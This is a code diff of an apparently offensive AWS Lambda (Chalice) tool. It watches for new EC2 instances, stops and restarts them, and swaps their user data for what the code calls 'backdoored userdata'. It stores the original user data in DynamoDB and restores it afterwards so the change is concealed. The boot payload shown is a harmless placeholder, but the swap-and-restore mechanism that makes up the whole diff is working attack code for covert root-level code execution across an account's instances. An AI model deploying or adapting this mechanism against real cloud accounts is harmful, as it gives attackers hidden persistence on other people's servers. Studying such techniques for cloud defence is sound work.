@@ -1,4 +1,5 @@
 import base64
+import json
 from enum import Enum
 import time
 from typing import TYPE_CHECKING
@@ -9,15 +10,22 @@ from typing import TypedDict, List
 
 if TYPE_CHECKING:
     import mypy_boto3_ec2
+    import mypy_boto3_sqs
     import mypy_boto3_dynamodb
     import mypy_boto3_dynamodb.type_defs
-    import mypy_boto3_events.type_defs
     import chalice.app
 
-    from mypy_boto3_ec2.type_defs import UserDataTypeDef, BlobAttributeValueTypeDef
-
-
+# These are also hardcoded in cloudformation.json
 DYNAMODB_TABLE = 'UserDataSwap'
+SQS_QUEUE = 'user-data-swap-restart-delay'
+
+USER_DATA = '''\
+#cloud-config
+
+bootcmd:
+ - echo HELLO FROM USER DATA SCRIPT | tee /msg > /dev/kmsg
+ - poweroff
+'''
 
 InstanceState = TypedDict('InstanceState', {
     'code': int,
@@ -103,69 +111,63 @@ def swap_user_data(inst: 'mypy_boto3_ec2.ServiceResource.Instance', user_data: s
     print("starting")
     inst.start()
 
-# @app.on_cw_event({
-#   "source": ["aws.ec2"],
-#   "detail-type": ["EC2 Instance State-change Notification"],
-#   "detail": {
-#     "state": ["pending", "running", "stopped"]
-#   }
-# })
-# def main(event: 'chalice.app.CloudWatchEvent'):
+@app.on_cw_event({
+  "source": ["aws.ec2"],
+  "detail-type": ["EC2 Instance State-change Notification"],
+  "detail": {
+    "state": ["pending", "running", "stopped"]
+  }
+})
+def on_ec2_run(event: 'chalice.app.CloudWatchEvent'):
+    """Triggered when a new instance is spun up, we simply forward the message to a SQS queue with a delay.
 
-# @app.on_cw_event({
-#   "source": ["aws.ec2"],
-#   "detail": {
-#     "eventSource": ["ec2.amazonaws.com"],
-#     "eventName": ["RunInstances"]
-#   }
-# })
-# def main(event: 'chalice.app.CloudWatchEvent'):
-#     event.detail: 'RunInstanceEvent'
-#     orig_user_data = event.detail['requestParameters'].get('userData', '')
-#     print("original user data: " + orig_user_data)
-#
-#     for instance in event.detail['responseElements']['instancesSet']['items']:
-#         inst = ec2.Instance(instance['instanceId'])
-#         swap_user_data(inst, '''\
-# #cloud-config
-#
-# bootcmd:
-#  - echo HELLO FROM USER DATA SCRIPT | tee /msg > /dev/kmsg
-#  - cloud-init clean && reboot
-# ''')
-#
-#         # Shutdown is handled in the bootcmd, this makes sure we don't modify the userData back to the original
-#         # before our userData runs. We can't simply wait for a running state because the cloud-init data may have not
-#         # run at that point.
-#         print('waiting for pending state')
-#         wait_for(inst, "pending")
-#
-#         print('waiting for stopped state')
-#         wait_for(inst, "stopped")
-#
-#         print('restoring user data')
-#         swap_user_data(inst, user_data=orig_user_data)
-#         print('done')
-#
-#     return {'status': "done"}
-#
+    The reason we may want to add a delay here is because some tools connect on start up to configure the instance,
+    for example terraform with the SSH provider. If we restart immediately we will likely get a new public IP address
+    and terraform will never connect to the instance. The delay here is simply a best guess since we can't actually
+    determine when configuration is complete.
 
-USER_DATA = '''\
-#cloud-config
+    :param event: CloudWatchEvent object passed in by chalice.
+    :return: {'status': "done"}
+    """
+    sqs = boto3.resource('sqs')
+    queue = sqs.Queue(SQS_QUEUE)
+    queue.send_message(MessageBody=json.dumps(event.detail), DelaySeconds=120)
+    return {'status': "done"}
 
-bootcmd:
- - echo HELLO FROM USER DATA SCRIPT | tee /msg > /dev/kmsg
- - cloud-init clean && reboot
-'''
+
+@app.on_sqs_message(queue=SQS_QUEUE)
+def restart(event: 'chalice.app.SQSEvent'):
+    """Stop and start the instance specified in the passed event object.
+
+    This function actively stops and starts the instance passed in on the event object, triggering the passive handling
+    of userdata in the on_stop function.
+
+    :param event: SQSEvent object passed in by chalice.
+    :return: {'status': "done"}
+    """
+    app.log.info("Event: %s", json.dumps(event.to_dict()))
+    orig_user_data = event.detail['requestParameters'].get('userData', '')
+    print("original user data: " + orig_user_data)
+    event = event.to_dict()
+
+    for instance in event['responseElements']['instancesSet']['items']:
+        inst = ec2.Instance(instance['instanceId'])
+        print(f"{inst.id}: stopping instance")
+        inst.stop()
+        print(f"{inst.id}: waiting for stopped state")
+        wait_for(inst, "stopped")
+
+        # Replacing userdata is handled by the on_stop function which is triggered by EC2 state change notifications
+        # It should run pretty quick, but we'll sleep for a second or two here just in case.
+        time.sleep(1)
+
+        print(f"{inst.id}: starting instance")
+        inst.start()
+
+    return {'status': "done"}
 
 
 # Valid States: ["pending", "running", "shutting-down", "terminated", "stopping", "stopped"]
-#
-# Event:
-#   {
-#     "instance-id": "i-01221288b498bc134",
-#     "state": "stopped"
-#   }
 #
 @app.on_cw_event({
   "source": ["aws.ec2"],
@@ -174,7 +176,20 @@ bootcmd:
     "state": ["stopped"]
   }
 })
-def on_stop(event: 'chalice.app.CloudWatchEvent'):
+def on_stop(event: 'chalice.app.CloudWatchEvent') -> dict:
+    """Runs on the instance stop event and sets or reverts userdata based on tracked instance state.
+
+    If this function has not seen this instance before then we set our own custom user data and set the tracked
+    instance state to pending_reset.
+
+    If the instance was found to be in the pending_reset state then we reset the user data back to it's original value
+    and set the tracked instance state to completed.
+
+    If the instance was found to be in the completed state we do nothing and exit.
+
+    :param event: CloudWatchEvent object passed in by chalice.
+    :return: Dictionary containing previous and current instance states.
+    """
     detail: InstanceChangeNotification = event.detail
 
     dynamodb = boto3.resource('dynamodb')
@@ -188,24 +203,30 @@ def on_stop(event: 'chalice.app.CloudWatchEvent'):
     if resp.get('Item'):
         inst_state = resp['Item'].get('inst_state')
 
+    new_state = None
     if not inst_state:
         print(f"'{inst.id}' (inst_state {inst_state}): setting backdoored userdata")
         orig_userdata = set_userdata(inst, USER_DATA)
         update_item(table, inst.id, 'orig_userdata', orig_userdata)
-        update_item(table, inst.id, 'inst_state', 'pending_reset')
+
+        new_state = 'pending_reset'
+        update_item(table, inst.id, 'inst_state', new_state)
         print(f"'{inst.id}' (inst_state {inst_state}): backdoored userdata set, set state to 'pending_reset'")
     elif inst_state == 'pending_reset':
         print(f"'{inst.id}' (state {inst_state}): reverting to original user data")
         orig_userdata = get_item(table, inst.id, 'orig_userdata')
         set_userdata(inst, orig_userdata)
         print(f"'{inst.id}' (inst_state {inst_state}): reverted to original user data")
-        print(f"'{inst.id}' (inst_state {inst_state}): starting")
-        update_item(table, inst.id, 'inst_state', 'completed')
+
+        new_state = 'completed'
+        update_item(table, inst.id, 'inst_state', new_state)
         print(f"'{inst.id}' (inst_state {inst_state}): starting, set inst_state to 'completed'")
     elif inst_state == 'completed':
         print(f"'{inst.id}' (inst_state {inst_state}): skipping due to state == 'completed'")
     else:
         raise UserWarning(f"{inst.id} in unknown inst_state: {inst_state}")
+
+    return {'previous_state': inst_state, 'current_state': new_state}
 
 
 def update_item(table: 'mypy_boto3_dynamodb.ServiceResource.Table', inst_id: str, key: str, value: str):
